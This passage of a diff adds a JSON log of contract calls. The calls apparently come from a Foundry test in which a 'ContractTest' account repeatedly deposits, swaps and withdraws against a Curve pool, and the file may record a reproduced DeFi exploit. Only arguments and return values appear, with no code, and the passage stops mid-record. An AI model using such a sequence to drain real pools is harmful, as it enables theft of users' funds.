+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "561748077339396658479357 [5.617e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11399890172634143148005 [1.139e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "331616",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "146235",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "5479969770222647918806 [5.479e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5479969770222647918806 [5.479e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555828156936985163250158 [5.558e23]"
+    },
+    {
+        "id": "167739",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "1626200273657905634339996 [1.626e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1626200273657905634339996 [1.626e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555828156936985163250158 [5.558e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 709508781484887121110045 [7.095e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5479969770222647918806 [5.479e21]"
+    },
+    {
+        "id": "101498",
+        "args": "5479969770222647918806 [5.479e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a06fc4be4d58ae00"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "555828156936985163250158 [5.558e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5479969770222647918806 [5.479e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2335709055142792755450041 [2.335e24]"
+    },
+    {
+        "id": "120402",
+        "args": "1, 0, 2335709055142792755450041 [2.335e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "621321818077077587463 [6.213e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 2335709055142792755450041 [2.335e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "103022",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "11926117165553932391269 [1.192e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11926117165553932391269 [1.192e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "562274304332316447722621 [5.622e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "11926117165553932391269 [1.192e22]"
+    },
+    {
+        "id": "291702",
+        "args": "11926117165553932391269 [1.192e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "562274304332316447722621 [5.622e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 11926117165553932391269 [1.192e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "252842",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "103022",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "5718882583917765263301 [5.718e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5718882583917765263301 [5.718e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556067069750680280594653 [5.56e23]"
+    },
+    {
+        "id": "132178",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "1774274712094215101595044 [1.774e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1774274712094215101595044 [1.774e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556067069750680280594653 [5.56e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 776058049822903767595868 [7.76e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5718882583917765263301 [5.718e21]"
+    },
+    {
+        "id": "101498",
+        "args": "5718882583917765263301 [5.718e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a04295c11304aafa"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556067069750680280594653 [5.56e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5718882583917765263301 [5.718e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2550332761917118869190912 [2.55e24]"
+    },
+    {
+        "id": "123005",
+        "args": "1, 0, 2550332761917118869190912 [2.55e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "618597559317283523746 [6.185e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 2550332761917118869190912 [2.55e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "105727",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "12497636733466003527378 [1.249e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12497636733466003527378 [1.249e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "562845823900228518858730 [5.628e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "12497636733466003527378 [1.249e22]"
+    },
+    {
+        "id": "294834",
+        "args": "12497636733466003527378 [1.249e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "562845823900228518858730 [5.628e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 12497636733466003527378 [1.249e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "255974",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "105727",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "5977716729693068395883 [5.977e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5977716729693068395883 [5.977e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556325903896455583727235 [5.563e23]"
+    },
+    {
+        "id": "132605",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "1941444333825071253808012 [1.941e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1941444333825071253808012 [1.941e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556325903896455583727235 [5.563e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 851818926135664121693688 [8.518e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "5977716729693068395883 [5.977e21]"
+    },
+    {
+        "id": "104101",
+        "args": "5977716729693068395883 [5.977e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a03db807eb4dd674"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556325903896455583727235 [5.563e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 5977716729693068395883 [5.977e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "2793263259960735375501700 [2.793e24]"
+    },
+    {
+        "id": "122995",
+        "args": "1, 0, 2793263259960735375501700 [2.793e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "615568607046200009650 [6.155e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 2793263259960735375501700 [2.793e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "105737",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "13120841202044417030078 [1.312e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13120841202044417030078 [1.312e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "563469028368806932361430 [5.634e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "13120841202044417030078 [1.312e22]"
+    },
+    {
+        "id": "300152",
+        "args": "13120841202044417030078 [1.312e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "563469028368806932361430 [5.634e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13120841202044417030078 [1.312e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "261292",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "105737",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "6258937500911958561591 [6.258e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6258937500911958561591 [6.258e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556607124667674473892943 [5.566e23]"
+    },
+    {
+        "id": "137913",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "2131400861611892593926011 [2.131e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2131400861611892593926011 [2.131e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556607124667674473892943 [5.566e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 938514575640042511613670 [9.385e23]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6258937500911958561591 [6.258e21]"
+    },
+    {
+        "id": "104091",
+        "args": "6258937500911958561591 [6.258e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a0488c7d72efc61f"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556607124667674473892943 [5.566e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6258937500911958561591 [6.258e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3069915437251935105539681 [3.069e24]"
+    },
+    {
+        "id": "122995",
+        "args": "1, 0, 3069915437251935105539681 [3.069e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "612264656936601504237 [6.122e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 3069915437251935105539681 [3.069e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "105737",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "13802986517587567963299 [1.38e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13802986517587567963299 [1.38e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "564151173684350083294651 [5.641e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "13802986517587567963299 [1.38e22]"
+    },
+    {
+        "id": "300152",
+        "args": "13802986517587567963299 [1.38e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "564151173684350083294651 [5.641e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 13802986517587567963299 [1.38e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "261292",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "105737",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "6565388497759829380117 [6.565e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6565388497759829380117 [6.565e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556913575664522344711469 [5.569e23]"
+    },
+    {
+        "id": "137913",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "2348471133245059948036271 [2.348e24]"
+    },
+    {
+        "id": "25681",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 2348471133245059948036271 [2.348e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556913575664522344711469 [5.569e23]"
+    },
+    {
+        "id": "2981",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 1038262232080537835406385 [1.038e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "6565388497759829380117 [6.565e21]"
+    },
+    {
+        "id": "104091",
+        "args": "6565388497759829380117 [6.565e21], 0, 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x000000000000000000000000000000000000000000000030a05b09ad5db9974a"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "556913575664522344711469 [5.569e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6565388497759829380117 [6.565e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "930",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "3386733365325597783442656 [3.386e24]"
+    },
+    {
+        "id": "128303",
+        "args": "1, 0, 3386733365325597783442656 [3.386e24], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "608678406948788898203 [6.086e20]"
+    },
+    {
+        "id": "3442",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], CurvePool: [0x8301AE4fc9c624d1D396cbDAa1ed877821D7C511], 3386733365325597783442656 [3.386e24]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "535",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "108452",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "14552527116052634011897 [1.455e22]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14552527116052634011897 [1.455e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "564900714282815149343249 [5.649e23]"
+    },
+    {
+        "id": "683",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496]",
+        "original_code": null,
+        "description": null,
+        "return_value": "14552527116052634011897 [1.455e22]"
+    },
+    {
+        "id": "300152",
+        "args": "14552527116052634011897 [1.455e22], [0, 0], true",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "564900714282815149343249 [5.649e23]"
+    },
+    {
+        "id": "2879",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 14552527116052634011897 [1.455e22]",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000001"
+    },
+    {
+        "id": "18",
+        "args": "0x0000000000000000000000000000000000000000000000000000000000000000",
+        "original_code": null,
+        "description": null,
+        "return_value": "0x0000000000000000000000000000000000000000000000000000000000000000"
+    },
+    {
+        "id": "261292",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "Returned"
+    },
+    {
+        "id": "105737",
+        "args": "[400000000000000000000 [4e20], 0], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "6900375708001485732531 [6.9e21]"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "550348187166762515331352 [5.503e23]"
+    },
+    {
+        "id": "25539",
+        "args": "ContractTest: [0x7FA9385bE102ac3EAc297483Dd6233D62b3e1496], 6900375708001485732531 [6.9e21]",
+        "original_code": null,
+        "description": null,
+        "return_value": "true"
+    },
+    {
+        "id": "624",
+        "args": "",
+        "original_code": null,
+        "description": null,
+        "return_value": "557248562874764001063883 [5.572e23]"
+    },
+    {
+        "id": "137913",
+        "args": "0, 1, 500000000000000000000 [5e20], 0, true",
+        "original_code": null,
+        "description": null,
+        "return_value": "2597907809324402345360081 [2.597e24]"
+    },
+    {
+        "id": "25681",
